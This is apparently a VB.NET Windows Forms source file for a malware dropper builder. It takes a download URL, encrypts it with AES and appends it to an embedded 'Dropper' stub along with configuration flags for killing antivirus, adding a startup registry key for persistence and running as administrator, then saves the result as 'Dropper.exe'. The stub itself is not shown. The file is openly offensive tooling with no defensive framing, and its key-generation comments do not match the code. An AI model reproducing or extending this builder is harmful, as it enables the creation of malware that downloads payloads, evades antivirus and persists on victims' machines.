Imports System.IO
Imports System.Text

Public Class Downloader
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim s As String = "eoZgNZb911slj1è孟韓xé大KRC說j通Sg秋B4i說A論67孝2ì" '40 bit
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 16 '16bit key
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        TextBox2.Text = sb.ToString()
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            CheckBox2.Checked = False
        Else CheckBox1.Checked = False
            CheckBox2.Checked = True
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            CheckBox1.Checked = False
        Else CheckBox2.Checked = False
            CheckBox1.Checked = True
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            TextBox3.Enabled = True
            CheckBox3.Checked = False
        Else CheckBox4.Checked = False
            TextBox3.Enabled = False
            CheckBox3.Checked = True
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            CheckBox4.Checked = False
        Else CheckBox3.Checked = False
            CheckBox4.Checked = True
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            MessageBox.Show("Insert a valid URL!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If
        If CheckBox4.Checked = True Then
            If TextBox3.Text = "" Then
                MessageBox.Show("Insert a valid key value! Or disable the startup function!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If
        End If
        'OK

        Dim DirectLinkDownload As String = ""
        Dim UrlEncryptionKey As String = ""

        Dim AntiVirusKill As String = "" ' Checkbox
        Dim StartUpKey As String = "" ' Checkbox
        Dim StartUpKey_Text As String = "" ' Reg Key Value

        Dim runasadmin As String = ""

        Dim stub As String = ""
        Const FS1 As String = "|FS|"
        Dim Temp As String = Application.StartupPath + "/stubdownloader.exe"
        Dim SFD As New SaveFileDialog
        SFD.Title = "Save Server"
        SFD.FileName = "Dropper.exe"
        SFD.DefaultExt = "exe"

        SFD.Filter = "Exe file (*.exe)|*.exe"

        If SFD.ShowDialog() = DialogResult.OK Then
            If SFD.FileName > "" Then
                Button1.Text = "Building ..."
                Button1.Enabled = False
                'Var Assign
                UrlEncryptionKey = TextBox2.Text
                DirectLinkDownload = AES_Encrypt(TextBox1.Text, UrlEncryptionKey)

                If CheckBox1.Checked = True Then
                    AntiVirusKill = "True"
                ElseIf CheckBox2.Checked = True Then
                    AntiVirusKill = "False"
                End If

                If CheckBox4.Checked = True Then
                    StartUpKey = "True"
                    StartUpKey_Text = TextBox3.Text
                ElseIf CheckBox3.Checked = True Then
                    StartUpKey = "False"
                    StartUpKey_Text = "-"
                End If

                If CheckBox6.Checked = True Then
                    runasadmin = "True"
                ElseIf CheckBox5.Checked = True Then
                    runasadmin = "False"
                End If

                Try
                    File.WriteAllBytes(Temp, My.Resources.Dropper)
                    FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                    stub = Space(LOF(1))
                    FileGet(1, stub)
                    FileClose(1)
                    FileOpen(1, SFD.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

                    FilePut(1, stub & FS1 & DirectLinkDownload & FS1 & UrlEncryptionKey & FS1 & AntiVirusKill & FS1 & StartUpKey & FS1 & StartUpKey_Text & FS1 & runasadmin & FS1) 'Args

                    FileClose(1)
                    If File.Exists("stubdownloader.exe") Then
                        Try
                            File.Delete("stubdownloader.exe")
                        Catch ex As Exception
                        End Try
                    End If
                Catch ex As Exception
                    If File.Exists("stubdownloader.exe") Then
                        Try
                            File.Delete("stubdownloader.exe")
                        Catch e1x As Exception
                        End Try
                    End If
                End Try
                MessageBox.Show(SFD.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If
        End If
        Button1.Text = "Build Downloader"
        Button1.Enabled = True



    End Sub

    Private Sub CheckBox6_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            CheckBox5.Checked = False
        Else CheckBox6.Checked = False
            CheckBox5.Checked = True
        End If
    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            CheckBox6.Checked = False
        Else CheckBox5.Checked = False
            CheckBox6.Checked = True
        End If
    End Sub

End Class